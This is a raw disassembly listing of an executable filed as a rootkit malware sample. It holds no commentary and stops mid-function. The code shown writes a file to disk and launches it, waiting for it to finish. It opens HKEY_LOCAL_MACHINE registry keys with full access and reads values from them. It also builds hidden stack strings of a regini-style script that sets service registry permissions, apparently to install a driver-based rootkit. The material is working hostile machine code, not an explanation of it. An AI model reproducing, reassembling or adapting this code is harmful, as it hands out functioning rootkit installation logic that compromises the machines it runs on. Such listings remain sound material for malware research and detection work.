
malware_samples/rootkit/d0a03a8905c4f695843bc4e9f2dd062b8fd7b0b00103236b5187ff3730750540.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	55                   	push   %ebp
  401001:	89 e5                	mov    %esp,%ebp
  401003:	81 ec 40 00 00 00    	sub    $0x40,%esp
  401009:	90                   	nop
  40100a:	b8 00 30 40 00       	mov    $0x403000,%eax
  40100f:	50                   	push   %eax
  401010:	e8 e3 16 00 00       	call   0x4026f8
  401015:	b9 0c 30 40 00       	mov    $0x40300c,%ecx
  40101a:	51                   	push   %ecx
  40101b:	50                   	push   %eax
  40101c:	e8 df 16 00 00       	call   0x402700
  401021:	89 45 fc             	mov    %eax,-0x4(%ebp)
  401024:	b8 00 00 00 00       	mov    $0x0,%eax
  401029:	89 45 c0             	mov    %eax,-0x40(%ebp)
  40102c:	b8 38 00 00 00       	mov    $0x38,%eax
  401031:	50                   	push   %eax
  401032:	b8 00 00 00 00       	mov    $0x0,%eax
  401037:	50                   	push   %eax
  401038:	8d 45 c4             	lea    -0x3c(%ebp),%eax
  40103b:	50                   	push   %eax
  40103c:	e8 c7 16 00 00       	call   0x402708
  401041:	83 c4 0c             	add    $0xc,%esp
  401044:	b8 3c 00 00 00       	mov    $0x3c,%eax
  401049:	89 45 c0             	mov    %eax,-0x40(%ebp)
  40104c:	8d 45 c0             	lea    -0x40(%ebp),%eax
  40104f:	83 c0 04             	add    $0x4,%eax
  401052:	b9 40 00 00 00       	mov    $0x40,%ecx
  401057:	89 08                	mov    %ecx,(%eax)
  401059:	8d 45 c0             	lea    -0x40(%ebp),%eax
  40105c:	83 c0 08             	add    $0x8,%eax
  40105f:	b9 00 00 00 00       	mov    $0x0,%ecx
  401064:	89 08                	mov    %ecx,(%eax)
  401066:	8d 45 c0             	lea    -0x40(%ebp),%eax
  401069:	83 c0 0c             	add    $0xc,%eax
  40106c:	b9 00 00 00 00       	mov    $0x0,%ecx
  401071:	89 08                	mov    %ecx,(%eax)
  401073:	8d 45 c0             	lea    -0x40(%ebp),%eax
  401076:	83 c0 10             	add    $0x10,%eax
  401079:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40107c:	89 08                	mov    %ecx,(%eax)
  40107e:	8d 45 c0             	lea    -0x40(%ebp),%eax
  401081:	83 c0 14             	add    $0x14,%eax
  401084:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  401087:	89 08                	mov    %ecx,(%eax)
  401089:	8d 45 c0             	lea    -0x40(%ebp),%eax
  40108c:	83 c0 18             	add    $0x18,%eax
  40108f:	8b 4d 10             	mov    0x10(%ebp),%ecx
  401092:	89 08                	mov    %ecx,(%eax)
  401094:	8d 45 c0             	lea    -0x40(%ebp),%eax
  401097:	83 c0 1c             	add    $0x1c,%eax
  40109a:	b9 00 00 00 00       	mov    $0x0,%ecx
  40109f:	89 08                	mov    %ecx,(%eax)
  4010a1:	8d 45 c0             	lea    -0x40(%ebp),%eax
  4010a4:	83 c0 20             	add    $0x20,%eax
  4010a7:	b9 00 00 00 00       	mov    $0x0,%ecx
  4010ac:	89 08                	mov    %ecx,(%eax)
  4010ae:	8d 45 c0             	lea    -0x40(%ebp),%eax
  4010b1:	50                   	push   %eax
  4010b2:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4010b5:	ff d0                	call   *%eax
  4010b7:	8d 45 c0             	lea    -0x40(%ebp),%eax
  4010ba:	83 c0 38             	add    $0x38,%eax
  4010bd:	8b 08                	mov    (%eax),%ecx
  4010bf:	83 f9 00             	cmp    $0x0,%ecx
  4010c2:	0f 84 14 00 00 00    	je     0x4010dc
  4010c8:	8d 45 c0             	lea    -0x40(%ebp),%eax
  4010cb:	83 c0 38             	add    $0x38,%eax
  4010ce:	b9 ff ff ff ff       	mov    $0xffffffff,%ecx
  4010d3:	51                   	push   %ecx
  4010d4:	8b 08                	mov    (%eax),%ecx
  4010d6:	51                   	push   %ecx
  4010d7:	e8 34 16 00 00       	call   0x402710
  4010dc:	c9                   	leave
  4010dd:	c3                   	ret
  4010de:	55                   	push   %ebp
  4010df:	89 e5                	mov    %esp,%ebp
  4010e1:	81 ec 08 00 00 00    	sub    $0x8,%esp
  4010e7:	90                   	nop
  4010e8:	b8 00 00 00 00       	mov    $0x0,%eax
  4010ed:	50                   	push   %eax
  4010ee:	b8 80 00 00 00       	mov    $0x80,%eax
  4010f3:	50                   	push   %eax
  4010f4:	b8 02 00 00 00       	mov    $0x2,%eax
  4010f9:	50                   	push   %eax
  4010fa:	b8 00 00 00 00       	mov    $0x0,%eax
  4010ff:	50                   	push   %eax
  401100:	b8 03 00 00 00       	mov    $0x3,%eax
  401105:	50                   	push   %eax
  401106:	b8 00 00 00 c0       	mov    $0xc0000000,%eax
  40110b:	50                   	push   %eax
  40110c:	8b 45 08             	mov    0x8(%ebp),%eax
  40110f:	50                   	push   %eax
  401110:	e8 03 16 00 00       	call   0x402718
  401115:	89 45 f8             	mov    %eax,-0x8(%ebp)
  401118:	8b 45 f8             	mov    -0x8(%ebp),%eax
  40111b:	83 f8 ff             	cmp    $0xffffffff,%eax
  40111e:	0f 84 45 00 00 00    	je     0x401169
  401124:	8b 45 0c             	mov    0xc(%ebp),%eax
  401127:	50                   	push   %eax
  401128:	e8 f3 15 00 00       	call   0x402720
  40112d:	83 c4 04             	add    $0x4,%esp
  401130:	b9 00 00 00 00       	mov    $0x0,%ecx
  401135:	51                   	push   %ecx
  401136:	8d 4d fc             	lea    -0x4(%ebp),%ecx
  401139:	51                   	push   %ecx
  40113a:	50                   	push   %eax
  40113b:	8b 45 0c             	mov    0xc(%ebp),%eax
  40113e:	50                   	push   %eax
  40113f:	8b 45 f8             	mov    -0x8(%ebp),%eax
  401142:	50                   	push   %eax
  401143:	e8 e0 15 00 00       	call   0x402728
  401148:	8b 45 f8             	mov    -0x8(%ebp),%eax
  40114b:	50                   	push   %eax
  40114c:	e8 df 15 00 00       	call   0x402730
  401151:	b8 00 00 00 00       	mov    $0x0,%eax
  401156:	50                   	push   %eax
  401157:	8b 45 08             	mov    0x8(%ebp),%eax
  40115a:	50                   	push   %eax
  40115b:	b8 1c 30 40 00       	mov    $0x40301c,%eax
  401160:	50                   	push   %eax
  401161:	e8 9a fe ff ff       	call   0x401000
  401166:	83 c4 0c             	add    $0xc,%esp
  401169:	b8 00 00 00 00       	mov    $0x0,%eax
  40116e:	e9 00 00 00 00       	jmp    0x401173
  401173:	c9                   	leave
  401174:	c3                   	ret
  401175:	55                   	push   %ebp
  401176:	89 e5                	mov    %esp,%ebp
  401178:	81 ec 08 00 00 00    	sub    $0x8,%esp
  40117e:	90                   	nop
  40117f:	8b 45 08             	mov    0x8(%ebp),%eax
  401182:	50                   	push   %eax
  401183:	e8 b0 15 00 00       	call   0x402738
  401188:	83 c4 04             	add    $0x4,%esp
  40118b:	b9 00 00 00 00       	mov    $0x0,%ecx
  401190:	51                   	push   %ecx
  401191:	b9 00 00 00 00       	mov    $0x0,%ecx
  401196:	51                   	push   %ecx
  401197:	b9 00 00 00 00       	mov    $0x0,%ecx
  40119c:	51                   	push   %ecx
  40119d:	b9 00 00 00 00       	mov    $0x0,%ecx
  4011a2:	51                   	push   %ecx
  4011a3:	50                   	push   %eax
  4011a4:	8b 45 08             	mov    0x8(%ebp),%eax
  4011a7:	50                   	push   %eax
  4011a8:	b8 00 00 00 00       	mov    $0x0,%eax
  4011ad:	50                   	push   %eax
  4011ae:	b8 00 00 00 00       	mov    $0x0,%eax
  4011b3:	50                   	push   %eax
  4011b4:	e8 87 15 00 00       	call   0x402740
  4011b9:	89 45 f8             	mov    %eax,-0x8(%ebp)
  4011bc:	8b 45 f8             	mov    -0x8(%ebp),%eax
  4011bf:	83 c0 01             	add    $0x1,%eax
  4011c2:	50                   	push   %eax
  4011c3:	e8 80 15 00 00       	call   0x402748
  4011c8:	83 c4 04             	add    $0x4,%esp
  4011cb:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4011ce:	8b 45 08             	mov    0x8(%ebp),%eax
  4011d1:	50                   	push   %eax
  4011d2:	e8 61 15 00 00       	call   0x402738
  4011d7:	83 c4 04             	add    $0x4,%esp
  4011da:	b9 00 00 00 00       	mov    $0x0,%ecx
  4011df:	51                   	push   %ecx
  4011e0:	b9 00 00 00 00       	mov    $0x0,%ecx
  4011e5:	51                   	push   %ecx
  4011e6:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  4011e9:	51                   	push   %ecx
  4011ea:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  4011ed:	51                   	push   %ecx
  4011ee:	50                   	push   %eax
  4011ef:	8b 45 08             	mov    0x8(%ebp),%eax
  4011f2:	50                   	push   %eax
  4011f3:	b8 00 00 00 00       	mov    $0x0,%eax
  4011f8:	50                   	push   %eax
  4011f9:	b8 00 00 00 00       	mov    $0x0,%eax
  4011fe:	50                   	push   %eax
  4011ff:	e8 3c 15 00 00       	call   0x402740
  401204:	8b 45 fc             	mov    -0x4(%ebp),%eax
  401207:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  40120a:	01 c8                	add    %ecx,%eax
  40120c:	b9 00 00 00 00       	mov    $0x0,%ecx
  401211:	88 08                	mov    %cl,(%eax)
  401213:	8b 45 fc             	mov    -0x4(%ebp),%eax
  401216:	e9 00 00 00 00       	jmp    0x40121b
  40121b:	c9                   	leave
  40121c:	c3                   	ret
  40121d:	55                   	push   %ebp
  40121e:	89 e5                	mov    %esp,%ebp
  401220:	81 ec 28 00 00 00    	sub    $0x28,%esp
  401226:	90                   	nop
  401227:	b8 00 00 00 00       	mov    $0x0,%eax
  40122c:	89 45 f8             	mov    %eax,-0x8(%ebp)
  40122f:	b8 00 00 00 00       	mov    $0x0,%eax
  401234:	89 45 f4             	mov    %eax,-0xc(%ebp)
  401237:	b8 00 00 00 00       	mov    $0x0,%eax
  40123c:	89 45 f0             	mov    %eax,-0x10(%ebp)
  40123f:	b8 23 30 40 00       	mov    $0x403023,%eax
  401244:	50                   	push   %eax
  401245:	e8 ae 14 00 00       	call   0x4026f8
  40124a:	b9 30 30 40 00       	mov    $0x403030,%ecx
  40124f:	51                   	push   %ecx
  401250:	50                   	push   %eax
  401251:	e8 aa 14 00 00       	call   0x402700
  401256:	89 45 ec             	mov    %eax,-0x14(%ebp)
  401259:	b8 40 30 40 00       	mov    $0x403040,%eax
  40125e:	50                   	push   %eax
  40125f:	e8 94 14 00 00       	call   0x4026f8
  401264:	b9 4d 30 40 00       	mov    $0x40304d,%ecx
  401269:	51                   	push   %ecx
  40126a:	50                   	push   %eax
  40126b:	e8 90 14 00 00       	call   0x402700
  401270:	89 45 e8             	mov    %eax,-0x18(%ebp)
  401273:	b8 5e 30 40 00       	mov    $0x40305e,%eax
  401278:	50                   	push   %eax
  401279:	e8 7a 14 00 00       	call   0x4026f8
  40127e:	b9 6b 30 40 00       	mov    $0x40306b,%ecx
  401283:	51                   	push   %ecx
  401284:	50                   	push   %eax
  401285:	e8 76 14 00 00       	call   0x402700
  40128a:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  40128d:	b8 00 00 00 00       	mov    $0x0,%eax
  401292:	50                   	push   %eax
  401293:	8d 45 f8             	lea    -0x8(%ebp),%eax
  401296:	50                   	push   %eax
  401297:	b8 00 00 00 00       	mov    $0x0,%eax
  40129c:	50                   	push   %eax
  40129d:	b8 3f 00 0f 00       	mov    $0xf003f,%eax
  4012a2:	50                   	push   %eax
  4012a3:	b8 00 00 00 00       	mov    $0x0,%eax
  4012a8:	50                   	push   %eax
  4012a9:	b8 00 00 00 00       	mov    $0x0,%eax
  4012ae:	50                   	push   %eax
  4012af:	b8 00 00 00 00       	mov    $0x0,%eax
  4012b4:	50                   	push   %eax
  4012b5:	8b 45 08             	mov    0x8(%ebp),%eax
  4012b8:	50                   	push   %eax
  4012b9:	b8 02 00 00 80       	mov    $0x80000002,%eax
  4012be:	50                   	push   %eax
  4012bf:	8b 45 ec             	mov    -0x14(%ebp),%eax
  4012c2:	ff d0                	call   *%eax
  4012c4:	b9 00 00 00 00       	mov    $0x0,%ecx
  4012c9:	39 c1                	cmp    %eax,%ecx
  4012cb:	0f 84 0a 00 00 00    	je     0x4012db
  4012d1:	b8 00 00 00 00       	mov    $0x0,%eax
  4012d6:	e9 e3 01 00 00       	jmp    0x4014be
  4012db:	b8 00 00 00 00       	mov    $0x0,%eax
  4012e0:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4012e3:	b8 04 00 00 00       	mov    $0x4,%eax
  4012e8:	89 45 e0             	mov    %eax,-0x20(%ebp)
  4012eb:	b8 00 02 00 00       	mov    $0x200,%eax
  4012f0:	50                   	push   %eax
  4012f1:	e8 52 14 00 00       	call   0x402748
  4012f6:	83 c4 04             	add    $0x4,%esp
  4012f9:	89 45 dc             	mov    %eax,-0x24(%ebp)
  4012fc:	b8 00 02 00 00       	mov    $0x200,%eax
  401301:	50                   	push   %eax
  401302:	b8 00 00 00 00       	mov    $0x0,%eax
  401307:	50                   	push   %eax
  401308:	8b 45 dc             	mov    -0x24(%ebp),%eax
  40130b:	50                   	push   %eax
  40130c:	e8 f7 13 00 00       	call   0x402708
  401311:	83 c4 0c             	add    $0xc,%esp
  401314:	b8 00 02 00 00       	mov    $0x200,%eax
  401319:	89 45 d8             	mov    %eax,-0x28(%ebp)
  40131c:	8d 45 d8             	lea    -0x28(%ebp),%eax
  40131f:	50                   	push   %eax
  401320:	8b 45 dc             	mov    -0x24(%ebp),%eax
  401323:	50                   	push   %eax
  401324:	8d 45 e0             	lea    -0x20(%ebp),%eax
  401327:	50                   	push   %eax
  401328:	b8 00 00 00 00       	mov    $0x0,%eax
  40132d:	50                   	push   %eax
  40132e:	b8 78 30 40 00       	mov    $0x403078,%eax
  401333:	50                   	push   %eax
  401334:	8b 45 f8             	mov    -0x8(%ebp),%eax
  401337:	50                   	push   %eax
  401338:	8b 45 e8             	mov    -0x18(%ebp),%eax
  40133b:	ff d0                	call   *%eax
  40133d:	83 f8 00             	cmp    $0x0,%eax
  401340:	0f 84 05 00 00 00    	je     0x40134b
  401346:	e9 3e 01 00 00       	jmp    0x401489
  40134b:	b8 00 02 00 00       	mov    $0x200,%eax
  401350:	50                   	push   %eax
  401351:	b8 00 00 00 00       	mov    $0x0,%eax
  401356:	50                   	push   %eax
  401357:	8b 45 dc             	mov    -0x24(%ebp),%eax
  40135a:	50                   	push   %eax
  40135b:	e8 a8 13 00 00       	call   0x402708
  401360:	83 c4 0c             	add    $0xc,%esp
  401363:	b8 00 02 00 00       	mov    $0x200,%eax
  401368:	89 45 d8             	mov    %eax,-0x28(%ebp)
  40136b:	8d 45 d8             	lea    -0x28(%ebp),%eax
  40136e:	50                   	push   %eax
  40136f:	8b 45 dc             	mov    -0x24(%ebp),%eax
  401372:	50                   	push   %eax
  401373:	8d 45 e0             	lea    -0x20(%ebp),%eax
  401376:	50                   	push   %eax
  401377:	b8 00 00 00 00       	mov    $0x0,%eax
  40137c:	50                   	push   %eax
  40137d:	b8 92 30 40 00       	mov    $0x403092,%eax
  401382:	50                   	push   %eax
  401383:	8b 45 f8             	mov    -0x8(%ebp),%eax
  401386:	50                   	push   %eax
  401387:	8b 45 e8             	mov    -0x18(%ebp),%eax
  40138a:	ff d0                	call   *%eax
  40138c:	83 f8 00             	cmp    $0x0,%eax
  40138f:	0f 84 05 00 00 00    	je     0x40139a
  401395:	e9 ef 00 00 00       	jmp    0x401489
  40139a:	b8 00 02 00 00       	mov    $0x200,%eax
  40139f:	50                   	push   %eax
  4013a0:	b8 00 00 00 00       	mov    $0x0,%eax
  4013a5:	50                   	push   %eax
  4013a6:	8b 45 dc             	mov    -0x24(%ebp),%eax
  4013a9:	50                   	push   %eax
  4013aa:	e8 59 13 00 00       	call   0x402708
  4013af:	83 c4 0c             	add    $0xc,%esp
  4013b2:	b8 00 02 00 00       	mov    $0x200,%eax
  4013b7:	89 45 d8             	mov    %eax,-0x28(%ebp)
  4013ba:	8d 45 d8             	lea    -0x28(%ebp),%eax
  4013bd:	50                   	push   %eax
  4013be:	8b 45 dc             	mov    -0x24(%ebp),%eax
  4013c1:	50                   	push   %eax
  4013c2:	8d 45 e0             	lea    -0x20(%ebp),%eax
  4013c5:	50                   	push   %eax
  4013c6:	b8 00 00 00 00       	mov    $0x0,%eax
  4013cb:	50                   	push   %eax
  4013cc:	b8 9e 30 40 00       	mov    $0x40309e,%eax
  4013d1:	50                   	push   %eax
  4013d2:	8b 45 f8             	mov    -0x8(%ebp),%eax
  4013d5:	50                   	push   %eax
  4013d6:	8b 45 e8             	mov    -0x18(%ebp),%eax
  4013d9:	ff d0                	call   *%eax
  4013db:	83 f8 00             	cmp    $0x0,%eax
  4013de:	0f 84 05 00 00 00    	je     0x4013e9
  4013e4:	e9 a0 00 00 00       	jmp    0x401489
  4013e9:	b8 01 00 00 00       	mov    $0x1,%eax
  4013ee:	89 45 e0             	mov    %eax,-0x20(%ebp)
  4013f1:	b8 00 02 00 00       	mov    $0x200,%eax
  4013f6:	89 45 d8             	mov    %eax,-0x28(%ebp)
  4013f9:	b8 00 02 00 00       	mov    $0x200,%eax
  4013fe:	50                   	push   %eax
  4013ff:	b8 00 00 00 00       	mov    $0x0,%eax
  401404:	50                   	push   %eax
  401405:	8b 45 dc             	mov    -0x24(%ebp),%eax
  401408:	50                   	push   %eax
  401409:	e8 fa 12 00 00       	call   0x402708
  40140e:	83 c4 0c             	add    $0xc,%esp
  401411:	8d 45 d8             	lea    -0x28(%ebp),%eax
  401414:	50                   	push   %eax
  401415:	8b 45 dc             	mov    -0x24(%ebp),%eax
  401418:	50                   	push   %eax
  401419:	8d 45 e0             	lea    -0x20(%ebp),%eax
  40141c:	50                   	push   %eax
  40141d:	b8 00 00 00 00       	mov    $0x0,%eax
  401422:	50                   	push   %eax
  401423:	b8 a8 30 40 00       	mov    $0x4030a8,%eax
  401428:	50                   	push   %eax
  401429:	8b 45 f8             	mov    -0x8(%ebp),%eax
  40142c:	50                   	push   %eax
  40142d:	8b 45 e8             	mov    -0x18(%ebp),%eax
  401430:	ff d0                	call   *%eax
  401432:	83 f8 00             	cmp    $0x0,%eax
  401435:	0f 84 0a 00 00 00    	je     0x401445
  40143b:	e9 49 00 00 00       	jmp    0x401489
  401440:	e9 3c 00 00 00       	jmp    0x401481
  401445:	8b 45 dc             	mov    -0x24(%ebp),%eax
  401448:	50                   	push   %eax
  401449:	e8 27 fd ff ff       	call   0x401175
  40144e:	83 c4 04             	add    $0x4,%esp
  401451:	89 45 f0             	mov    %eax,-0x10(%ebp)
  401454:	8b 45 f0             	mov    -0x10(%ebp),%eax
  401457:	83 f8 00             	cmp    $0x0,%eax
  40145a:	0f 84 21 00 00 00    	je     0x401481
  401460:	8b 45 f0             	mov    -0x10(%ebp),%eax
  401463:	83 c0 04             	add    $0x4,%eax
  401466:	50                   	push   %eax
  401467:	8b 45 0c             	mov    0xc(%ebp),%eax
  40146a:	50                   	push   %eax
  40146b:	e8 e0 12 00 00       	call   0x402750
  401470:	83 c4 08             	add    $0x8,%esp
  401473:	83 f8 00             	cmp    $0x0,%eax
  401476:	0f 84 05 00 00 00    	je     0x401481
  40147c:	e9 08 00 00 00       	jmp    0x401489
  401481:	b8 01 00 00 00       	mov    $0x1,%eax
  401486:	89 45 f4             	mov    %eax,-0xc(%ebp)
  401489:	8b 45 f0             	mov    -0x10(%ebp),%eax
  40148c:	83 f8 00             	cmp    $0x0,%eax
  40148f:	0f 84 0c 00 00 00    	je     0x4014a1
  401495:	8b 45 f0             	mov    -0x10(%ebp),%eax
  401498:	50                   	push   %eax
  401499:	e8 ba 12 00 00       	call   0x402758
  40149e:	83 c4 04             	add    $0x4,%esp
  4014a1:	8b 45 dc             	mov    -0x24(%ebp),%eax
  4014a4:	50                   	push   %eax
  4014a5:	e8 ae 12 00 00       	call   0x402758
  4014aa:	83 c4 04             	add    $0x4,%esp
  4014ad:	8b 45 f8             	mov    -0x8(%ebp),%eax
  4014b0:	50                   	push   %eax
  4014b1:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  4014b4:	ff d0                	call   *%eax
  4014b6:	8b 45 f4             	mov    -0xc(%ebp),%eax
  4014b9:	e9 00 00 00 00       	jmp    0x4014be
  4014be:	c9                   	leave
  4014bf:	c3                   	ret
  4014c0:	55                   	push   %ebp
  4014c1:	89 e5                	mov    %esp,%ebp
  4014c3:	81 ec 9c 04 00 00    	sub    $0x49c,%esp
  4014c9:	90                   	nop
  4014ca:	b8 48 00 00 00       	mov    $0x48,%eax
  4014cf:	88 85 6d ff ff ff    	mov    %al,-0x93(%ebp)
  4014d5:	b8 4b 00 00 00       	mov    $0x4b,%eax
  4014da:	88 85 6e ff ff ff    	mov    %al,-0x92(%ebp)
  4014e0:	b8 45 00 00 00       	mov    $0x45,%eax
  4014e5:	88 85 6f ff ff ff    	mov    %al,-0x91(%ebp)
  4014eb:	b8 59 00 00 00       	mov    $0x59,%eax
  4014f0:	88 85 70 ff ff ff    	mov    %al,-0x90(%ebp)
  4014f6:	b8 5f 00 00 00       	mov    $0x5f,%eax
  4014fb:	88 85 71 ff ff ff    	mov    %al,-0x8f(%ebp)
  401501:	b8 4c 00 00 00       	mov    $0x4c,%eax
  401506:	88 85 72 ff ff ff    	mov    %al,-0x8e(%ebp)
  40150c:	b8 4f 00 00 00       	mov    $0x4f,%eax
  401511:	88 85 73 ff ff ff    	mov    %al,-0x8d(%ebp)
  401517:	b8 43 00 00 00       	mov    $0x43,%eax
  40151c:	88 85 74 ff ff ff    	mov    %al,-0x8c(%ebp)
  401522:	b8 41 00 00 00       	mov    $0x41,%eax
  401527:	88 85 75 ff ff ff    	mov    %al,-0x8b(%ebp)
  40152d:	b8 4c 00 00 00       	mov    $0x4c,%eax
  401532:	88 85 76 ff ff ff    	mov    %al,-0x8a(%ebp)
  401538:	b8 5f 00 00 00       	mov    $0x5f,%eax
  40153d:	88 85 77 ff ff ff    	mov    %al,-0x89(%ebp)
  401543:	b8 4d 00 00 00       	mov    $0x4d,%eax
  401548:	88 85 78 ff ff ff    	mov    %al,-0x88(%ebp)
  40154e:	b8 41 00 00 00       	mov    $0x41,%eax
  401553:	88 85 79 ff ff ff    	mov    %al,-0x87(%ebp)
  401559:	b8 43 00 00 00       	mov    $0x43,%eax
  40155e:	88 85 7a ff ff ff    	mov    %al,-0x86(%ebp)
  401564:	b8 48 00 00 00       	mov    $0x48,%eax
  401569:	88 85 7b ff ff ff    	mov    %al,-0x85(%ebp)
  40156f:	b8 49 00 00 00       	mov    $0x49,%eax
  401574:	88 85 7c ff ff ff    	mov    %al,-0x84(%ebp)
  40157a:	b8 4e 00 00 00       	mov    $0x4e,%eax
  40157f:	88 85 7d ff ff ff    	mov    %al,-0x83(%ebp)
  401585:	b8 45 00 00 00       	mov    $0x45,%eax
  40158a:	88 85 7e ff ff ff    	mov    %al,-0x82(%ebp)
  401590:	b8 5c 00 00 00       	mov    $0x5c,%eax
  401595:	88 85 7f ff ff ff    	mov    %al,-0x81(%ebp)
  40159b:	b8 25 00 00 00       	mov    $0x25,%eax
  4015a0:	88 45 80             	mov    %al,-0x80(%ebp)
  4015a3:	b8 73 00 00 00       	mov    $0x73,%eax
  4015a8:	88 45 81             	mov    %al,-0x7f(%ebp)
  4015ab:	b8 20 00 00 00       	mov    $0x20,%eax
  4015b0:	88 45 82             	mov    %al,-0x7e(%ebp)
  4015b3:	b8 5b 00 00 00       	mov    $0x5b,%eax
  4015b8:	88 45 83             	mov    %al,-0x7d(%ebp)
  4015bb:	b8 31 00 00 00       	mov    $0x31,%eax
  4015c0:	88 45 84             	mov    %al,-0x7c(%ebp)
  4015c3:	b8 20 00 00 00       	mov    $0x20,%eax
  4015c8:	88 45 85             	mov    %al,-0x7b(%ebp)
  4015cb:	b8 37 00 00 00       	mov    $0x37,%eax
  4015d0:	88 45 86             	mov    %al,-0x7a(%ebp)
  4015d3:	b8 20 00 00 00       	mov    $0x20,%eax
  4015d8:	88 45 87             	mov    %al,-0x79(%ebp)
  4015db:	b8 31 00 00 00       	mov    $0x31,%eax
  4015e0:	88 45 88             	mov    %al,-0x78(%ebp)
  4015e3:	b8 37 00 00 00       	mov    $0x37,%eax
  4015e8:	88 45 89             	mov    %al,-0x77(%ebp)
  4015eb:	b8 5d 00 00 00       	mov    $0x5d,%eax
  4015f0:	88 45 8a             	mov    %al,-0x76(%ebp)
  4015f3:	b8 0d 00 00 00       	mov    $0xd,%eax
  4015f8:	88 45 8b             	mov    %al,-0x75(%ebp)
  4015fb:	b8 0a 00 00 00       	mov    $0xa,%eax
  401600:	88 45 8c             	mov    %al,-0x74(%ebp)
  401603:	b8 48 00 00 00       	mov    $0x48,%eax
  401608:	88 45 8d             	mov    %al,-0x73(%ebp)
  40160b:	b8 4b 00 00 00       	mov    $0x4b,%eax
  401610:	88 45 8e             	mov    %al,-0x72(%ebp)
  401613:	b8 45 00 00 00       	mov    $0x45,%eax
  401618:	88 45 8f             	mov    %al,-0x71(%ebp)
  40161b:	b8 59 00 00 00       	mov    $0x59,%eax
  401620:	88 45 90             	mov    %al,-0x70(%ebp)
  401623:	b8 5f 00 00 00       	mov    $0x5f,%eax
  401628:	88 45 91             	mov    %al,-0x6f(%ebp)
  40162b:	b8 4c 00 00 00       	mov    $0x4c,%eax
  401630:	88 45 92             	mov    %al,-0x6e(%ebp)
  401633:	b8 4f 00 00 00       	mov    $0x4f,%eax
  401638:	88 45 93             	mov    %al,-0x6d(%ebp)
  40163b:	b8 43 00 00 00       	mov    $0x43,%eax
  401640:	88 45 94             	mov    %al,-0x6c(%ebp)
  401643:	b8 41 00 00 00       	mov    $0x41,%eax
  401648:	88 45 95             	mov    %al,-0x6b(%ebp)
  40164b:	b8 4c 00 00 00       	mov    $0x4c,%eax
  401650:	88 45 96             	mov    %al,-0x6a(%ebp)
  401653:	b8 5f 00 00 00       	mov    $0x5f,%eax
  401658:	88 45 97             	mov    %al,-0x69(%ebp)
  40165b:	b8 4d 00 00 00       	mov    $0x4d,%eax
  401660:	88 45 98             	mov    %al,-0x68(%ebp)
  401663:	b8 41 00 00 00       	mov    $0x41,%eax
  401668:	88 45 99             	mov    %al,-0x67(%ebp)
  40166b:	b8 43 00 00 00       	mov    $0x43,%eax
  401670:	88 45 9a             	mov    %al,-0x66(%ebp)
  401673:	b8 48 00 00 00       	mov    $0x48,%eax
  401678:	88 45 9b             	mov    %al,-0x65(%ebp)
  40167b:	b8 49 00 00 00       	mov    $0x49,%eax
  401680:	88 45 9c             	mov    %al,-0x64(%ebp)
  401683:	b8 4e 00 00 00       	mov    $0x4e,%eax
  401688:	88 45 9d             	mov    %al,-0x63(%ebp)
  40168b:	b8 45 00 00 00       	mov    $0x45,%eax
  401690:	88 45 9e             	mov    %al,-0x62(%ebp)
  401693:	b8 5c 00 00 00       	mov    $0x5c,%eax
  401698:	88 45 9f             	mov    %al,-0x61(%ebp)
  40169b:	b8 25 00 00 00       	mov    $0x25,%eax
  4016a0:	88 45 a0             	mov    %al,-0x60(%ebp)
  4016a3:	b8 73 00 00 00       	mov    $0x73,%eax
  4016a8:	88 45 a1             	mov    %al,-0x5f(%ebp)
  4016ab:	b8 0d 00 00 00       	mov    $0xd,%eax
  4016b0:	88 45 a2             	mov    %al,-0x5e(%ebp)
  4016b3:	b8 0a 00 00 00       	mov    $0xa,%eax
  4016b8:	88 45 a3             	mov    %al,-0x5d(%ebp)
  4016bb:	b8 45 00 00 00       	mov    $0x45,%eax
  4016c0:	88 45 a4             	mov    %al,-0x5c(%ebp)
  4016c3:	b8 72 00 00 00       	mov    $0x72,%eax
  4016c8:	88 45 a5             	mov    %al,-0x5b(%ebp)
  4016cb:	b8 72 00 00 00       	mov    $0x72,%eax
  4016d0:	88 45 a6             	mov    %al,-0x5a(%ebp)
  4016d3:	b8 6f 00 00 00       	mov    $0x6f,%eax
  4016d8:	88 45 a7             	mov    %al,-0x59(%ebp)
  4016db:	b8 72 00 00 00       	mov    $0x72,%eax
  4016e0:	88 45 a8             	mov    %al,-0x58(%ebp)
  4016e3:	b8 43 00 00 00       	mov    $0x43,%eax
  4016e8:	88 45 a9             	mov    %al,-0x57(%ebp)
  4016eb:	b8 6f 00 00 00       	mov    $0x6f,%eax
  4016f0:	88 45 aa             	mov    %al,-0x56(%ebp)
  4016f3:	b8 6e 00 00 00       	mov    $0x6e,%eax
  4016f8:	88 45 ab             	mov    %al,-0x55(%ebp)
  4016fb:	b8 74 00 00 00       	mov    $0x74,%eax
  401700:	88 45 ac             	mov    %al,-0x54(%ebp)
  401703:	b8 72 00 00 00       	mov    $0x72,%eax
  401708:	88 45 ad             	mov    %al,-0x53(%ebp)
  40170b:	b8 6f 00 00 00       	mov    $0x6f,%eax
  401710:	88 45 ae             	mov    %al,-0x52(%ebp)
  401713:	b8 6c 00 00 00       	mov    $0x6c,%eax
  401718:	88 45 af             	mov    %al,-0x51(%ebp)
  40171b:	b8 20 00 00 00       	mov    $0x20,%eax
  401720:	88 45 b0             	mov    %al,-0x50(%ebp)
  401723:	b8 3d 00 00 00       	mov    $0x3d,%eax
  401728:	88 45 b1             	mov    %al,-0x4f(%ebp)
  40172b:	b8 20 00 00 00       	mov    $0x20,%eax
  401730:	88 45 b2             	mov    %al,-0x4e(%ebp)
  401733:	b8 52 00 00 00       	mov    $0x52,%eax
  401738:	88 45 b3             	mov    %al,-0x4d(%ebp)
  40173b:	b8 45 00 00 00       	mov    $0x45,%eax
  401740:	88 45 b4             	mov    %al,-0x4c(%ebp)
  401743:	b8 47 00 00 00       	mov    $0x47,%eax
  401748:	88 45 b5             	mov    %al,-0x4b(%ebp)
  40174b:	b8 5f 00 00 00       	mov    $0x5f,%eax
